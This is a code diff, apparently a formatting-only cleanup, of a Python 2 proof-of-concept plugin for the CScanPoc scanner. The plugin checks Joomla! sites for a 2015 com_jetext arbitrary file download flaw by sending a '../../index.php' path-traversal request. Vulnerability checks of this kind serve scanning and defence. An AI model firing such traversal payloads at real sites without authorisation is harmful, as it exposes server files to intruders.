@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Joomla_0005' # 平台漏洞编号，留空
+    vuln_id = 'Joomla_0005'  # 平台漏洞编号，留空
     name = 'Joomla! /index.php 任意文件下载'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_DOWNLOAD # 漏洞类型
+    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
     disclosure_date = '2015-10-05'  # 漏洞公布时间
     desc = '''
         /index.php 文件用于文件下载，/index.php?option=com_jetext&task=download&
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'Joomla!'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '1036a24f-3e3b-4cb3-beff-0157dcbe8a18'
@@ -32,20 +34,22 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            verify_url = self.target + "/index.php?option=com_jetext&task=download&file=../../index.php"
+
+            verify_url = self.target + \
+                "/index.php?option=com_jetext&task=download&file=../../index.php"
             request = urllib2.Request(verify_url)
             response = urllib2.urlopen(request)
             content = response.read()
             if 'Id: index.php' in content:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
